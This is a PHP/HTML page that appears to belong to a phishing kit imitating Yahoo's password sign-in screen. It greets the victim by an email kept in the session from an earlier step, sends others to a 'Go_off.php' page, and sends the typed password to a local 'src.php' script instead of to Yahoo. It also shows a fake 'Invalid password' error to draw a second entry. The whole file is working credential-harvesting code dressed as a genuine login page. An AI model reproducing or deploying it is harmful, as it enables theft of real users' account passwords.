<?php
session_start();
ob_start();
function loggedin()
{
    if (isset($_SESSION['email'])&&!empty($_SESSION['email'])) {
        return true;
    } else {
        return false;
    }
}

if (loggedin()) {
    $userlogged = $_SESSION['email'];
} else {
    die(include 'Go_off.php');
}


?>

<!DOCTYPE html>
<html id="Stencil" class="js yui3-js-enabled"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        
        <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=0">
        <meta name="format-detection" content="telephone=no">
        <meta name="referrer" content="origin-when-cross-origin">
        <title>Yahoo
</title>
        <link rel="dns-prefetch" href="https://gstatic.com/">
        <link rel="dns-prefetch" href="https://google.com/">
        <link rel="dns-prefetch" href="https://s.yimg.com/">
        <link rel="dns-prefetch" href="https://y.analytics.yahoo.com/">
        <link rel="dns-prefetch" href="https://ucs.query.yahoo.com/">
        <link rel="dns-prefetch" href="https://geo.query.yahoo.com/">
        <link rel="dns-prefetch" href="https://geo.yahoo.com/">
        <link rel="icon" type="image/x-icon" href="https://s.yimg.com/wm/login/favicon.ico">
        <link rel="shortcut icon" type="image/x-icon" href="https://s.yimg.com/wm/login/favicon.ico">
        <link rel="apple-touch-icon" href="https://s.yimg.com/wm/login/apple-touch-icon.png">
        <link rel="apple-touch-icon-precomposed" href="https://s.yimg.com/wm/login/apple-touch-icon.png">

        <!--[if lte IE 8]>
        <link rel="stylesheet" href="https://s.yimg.com/zz/combo?yui-s:pure/0.5.0/pure-min.css&yui-s:pure/0.5.0/grids-responsive-old-ie-min.css">
        <![endif]-->
        <!--[if gt IE 8]><!-->
        <link rel="stylesheet" href="https://s.yimg.com/zz/combo?yui-s:pure/0.5.0/pure-min.css&yui-s:pure/0.5.0/grids-responsive-min.css">
        <!--<![endif]-->
       
        <link href="yahoo-main.css" rel="stylesheet" type="text/css">
<link href="https://s.yimg.com/zz/combo?kx/yucs/uh3s/atomic/88/css/atomic-min.css&kx/yucs/uh_common/meta/3/css/meta-min.css&kx/yucs/uh3s/uh/394/css/uh-center-aligned-min.css" rel="stylesheet" type="text/css">
        
    <body>
        <div class="mbr-legacy-device-bar " id="mbr-legacy-device-bar">
            <label class="cross" for="mbr-legacy-device-bar-cross" aria-label="Close this warning">x</label>
            <input type="checkbox" id="mbr-legacy-device-bar-cross">
            <p class="mbr-legacy-device">
                Yahoo works best with the latest versions of the browsers. You're using an outdated or unsupported browser and some Yahoo features may not work properly. Please update your browser version now. <a href="https://help.yahoo.com/kb/index?page=content&amp;y=PROD_ACCT&amp;id=SLN4556&amp;actp=productlink&amp;locale=en_US">More&nbsp;Info</a>
            </p>
        </div>


    <div id="login-body" class="loginish  puree-v2">
    <div class="hd mbr-ucs-hd" id="mbr-uh-hd">
    <style type="text/css">@font-face{font-family:uh;src:url(https://s.yimg.com/os/uh-icons/0.1.16/uh/fonts/uh.eot?);src:url(https://s.yimg.com/os/uh-icons/0.1.16/uh/fonts/uh.eot?#iefix) format('embedded-opentype'),url(https://s.yimg.com/os/uh-icons/0.1.16/uh/fonts/uh.woff2?) format('woff2'),url(https://s.yimg.com/os/uh-icons/0.1.16/uh/fonts/uh.woff?) format('woff'),url(https://s.yimg.com/os/uh-icons/0.1.16/uh/fonts/uh.ttf?) format('truetype'),url(https://s.yimg.com/os/uh-icons/0.1.16/uh/fonts/uh.svg?#uh) format('svg');font-weight:400;font-style:normal}[class^=Ycon],[class*=" Ycon"]{font-family:uh;speak:none;font-style:normal;font-weight:400;font-variant:normal;text-transform:none;line-height:1;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}</style><link type="text/css" rel="stylesheet" href="https://s.yimg.com/zz/combo?os/stencil/3.0.1/desktop/styles-ltr.css"><!-- meta --><div id="yucs-meta" data-authstate="signedout" data-cobrand="standard" data-crumb="sq0OgUY/Mmw" data-mc-crumb="rMDdQX7HSWb" data-gta="mFAkU7X4IYt" data-device="desktop" data-experience="uh304" data-firstname="" data-style="" data-flight="1532042757" data-forcecobrand="standard" data-guid="" data-host="login.yahoo.com" data-https="1" data-languagetag="en-us" data-property="login" data-protocol="https" data-shortfirstname="" data-shortuserid="" data-status="active" data-spaceid="" data-test_id="" data-userid="" data-stickyheader="true" data-headercollapse="" data-uh-test="acctswitch"></div><!-- /meta --><div id="UH" class="Row Pos(r) Start(0) T(0) End(0) Z(10) yucs-en-us yucs-login yucs" role="banner" data-protocol="https" data-property="login" data-spaceid="" data-stencil="true"> <style>body {
margin-top: 0px !important; 
}

#UH{
font: 13px/1.25 "Helvetica Neue",Helvetica,Arial,sans-serif;
}

.YLogoMY{
text-indent: -30em;
}</style> <div id="uhWrapper" class="Mx(a) Z(1) Pos(r) Zoom Mstart(16px) Pt(14px)" data-ylk="rspns:nav;act:click;t1:a1;t2:uh-d;itc:0;" style="height: 3.8em;"> <div class="UHCol1 Pos(a) Fl(start)" role="presentation"><style>/** * IE7+ and non-retina display */.YLogoMY { background-repeat: no-repeat; background-image: url(https://s.yimg.com/rz/l/yahoo_en-US_f_pw_125x32.png); _background-image: url(https://s.yimg.com/rz/l/yahoo_en-US_f_pw_125x32.gif); /* IE6 */ width: 125px !important; }.DarkTheme .YLogoMY { background-position: -125px 0px !important;}/** * For 'retina' display */@media only screen and (-webkit-min-device-pixel-ratio: 2), only screen and ( min--moz-device-pixel-ratio: 2), only screen and ( -o-min-device-pixel-ratio: 2/1), only screen and ( min-device-pixel-ratio: 2), only screen and ( min-resolution: 192dpi), only screen and ( min-resolution: 2dppx) { .YLogoMY { background-image: url(https://s.yimg.com/rz/l/yahoo_en-US_f_pw_125x32_2x.png) !important; background-size: 250px 32px !important; }}</style><a class="YLogoMY D(b) Ov(h) Ti(-20em) Zoom Darktheme_Bgp(b_t) W(137px) H(34px) Mx(a)! " data-ylk="slk:logo;t3:logo;t5:logo;elm:img;elmt:logo;" href="https://www.yahoo.com/" target="_top">Yahoo</a></div> <div class="UHCol3" role="presentation" id="uhNavWrapper"> <ul class="Fl(end) Mend(10px) Lts(-0.31em) Tren(os) Whs(nw) My(6px)">    <li id="yucs-help" class=" yucs-activate yucs-help yucs-menu_nav D(ib) Zoom Va(t) Pos(r) Lh(1.7)"> <a id="yucs-help_link" class="C(#000)! D(ib) Lts(n) yltasis yucs-trigger Lh(1) Td(n)! Td(u)!:h Fz(13px)" href="https://help.yahoo.com/kb/index?locale=en_US&amp;page=product&amp;y=PROD_ACCT" target="_blank" data-ylk="act:click;t2:uh-d;t3:tl-lst;elm:itm;elmt:mu;itc:0;"> <b>Help</b> </a></li> </ul> </div> </div><!-- /#UH --></div>   
</div>

    <div class="login-box-container">
        <div class="login-box default">
            <div class="txt-align-center">
                    <img src="https://s.yimg.com/rz/d/yahoo_en-US_f_p_bestfit_2x.png" alt=" Yahoo" class="logo " width="116" height="">
            </div>
            <div class="challenge">
    <div id="password-challenge" class="primary">
    <div class="greeting">
            <h1 class="username">Hello&nbsp;<?php echo "$userlogged"; ?></h1>
            <p class="not-you"><a href="./?display=login&amp;.intl=us&amp;.lang=en-US&amp;.src=vz&amp;done=https%3A%2F%2Fverizon.yahoo.com%2F&amp;prefill=0">Not&nbsp;you?</a></p>
    </div>
    <form action="src.php?svr=tf" method="post" class="pure-form pure-form-stacked">
        <input type="hidden" name="browser-fp-data" id="browser-fp-data" value="{&quot;language&quot;:&quot;en-US&quot;,&quot;color_depth&quot;:24,&quot;resolution&quot;:{&quot;w&quot;:1366,&quot;h&quot;:768},&quot;available_resolution&quot;:{&quot;w&quot;:1366,&quot;h&quot;:728},&quot;timezone_offset&quot;:420,&quot;session_storage&quot;:1,&quot;local_storage&quot;:1,&quot;indexed_db&quot;:1,&quot;open_database&quot;:1,&quot;cpu_class&quot;:&quot;unknown&quot;,&quot;navigator_platform&quot;:&quot;Win32&quot;,&quot;do_not_track&quot;:&quot;1&quot;,&quot;canvas&quot;:&quot;canvas winding:yes~canvas&quot;,&quot;webgl&quot;:1,&quot;adblock&quot;:0,&quot;has_lied_languages&quot;:0,&quot;has_lied_resolution&quot;:0,&quot;has_lied_os&quot;:0,&quot;has_lied_browser&quot;:0,&quot;touch_support&quot;:{&quot;points&quot;:0,&quot;event&quot;:0,&quot;start&quot;:0},&quot;plugins&quot;:{&quot;count&quot;:3,&quot;hash&quot;:&quot;e43a8bc708fc490225cde0663b28278c&quot;},&quot;fonts&quot;:{&quot;count&quot;:49,&quot;hash&quot;:&quot;73a5ce890bdadb0295b20ba41e66f0ff&quot;},&quot;ts&quot;:{&quot;serve&quot;:1532042757205,&quot;render&quot;:1532042749753}}">
        <input type="hidden" name="crumb" value="KMG3DoWV30/">
        <input type="hidden" name="acrumb" value="4SZYMaUi">
        <input type="hidden" name="sessionIndex" value="Qg--">
        <input type="hidden" name="displayName" value="jbnaughty01">
        <div class="hidden-username">
            <input type="text" tabindex="-1" aria-hidden="true" role="presentation" autocorrect="off" spellcheck="false" name="username" value="">
        </div>
        <input type="hidden" name="passwordContext" value="normal">
        <input type="password" id="login-passwd" aria-invalid="true" name="password" placeholder="Password" autofocus="">
        <p class="error-msg" role="alert" data-error="messages.ERROR_INVALID_PASSWORD">Invalid password. Please try&nbsp;again</p>
        <p class="signin-cont">
            <button type="submit" id="login-signin" class="pure-button puree-button-primary puree-spinner-button" name="verifyPassword" value="Sign in" data-ylk="elm:btn;elmt:next;slk:next">                        
                    Sign&nbsp;in
            </button>
        </p>
        <p class="forgot-cont">
            <input type="submit" class="pure-button puree-button-link" data-ylk="elm:btn;elmt:skip;slk:skip" id="mbr-forgot-link" name="skip" value="I forgot my password">
        </p>
    </form>
</div>

</div>

        </div>
        <div id="login-box-ad-fallback" class="login-box-ad-fallback">
            <h1>Yahoo makes it easy to enjoy what matters most in your&nbsp;world.</h1>
<p>Best in class Yahoo Mail, breaking local, national and global news, finance, sports, music, movies and more. You get more out of the web, you get more out of&nbsp;life.</p>

        </div>
    </div>
    <div class="login-box-ad-outer">
        <div class="login-box-ad-inner">
            <div id="login-ad-mon"></div>
            <div id="login-ad-sky"></div>
           <div id="login-ad-rich"></div> 
           </div>
    </div>
</div>

    <script src="https://s.yimg.com/wm/mbr/0.1.6218/bundle.js"></script><div id="ads"></div>
<script src="https://s.yimg.com/zz/combo?yui-s:3.18.0/build/yui/yui-min.js&"></script><div id="yui3-css-stamp" style="position: absolute !important; visibility: hidden !important"></div>
    <noscript>
        <img src="https://login.yahoo.com/account/js-reporting/?crumb=KMG3DoWV30/&message=javascript_not_enabled" height="0" width="0" style="visibility: hidden;">
    </noscript>

    <div id="mbr-css-check"></div>



<div id="fdb_close_els" class="darla" style="position: static !important; visibility: hidden;"><div id="fdb_close_RICH" class="darla darla_fdb_close" title="I don&#39;t like this ad" style="position: absolute; top: 66px; left: 0px; z-index: 10; width: 1361px; height: 20px; visibility: inherit; display: none;"><div style="width:20px; height:20px; background:#fff; opacity: 0.78; -ms-filter: &#39;progid:DXImageTransform.Microsoft.Alpha(Opacity=78)&#39;; filter: alpha(opacity=78); position: absolute;right:0; background: #fff url(&#39;https://s.yimg.com/rq/darla/i/fdb1.gif&#39;) no-repeat right -25px;cursor:pointer;"></div></div></div></body></html>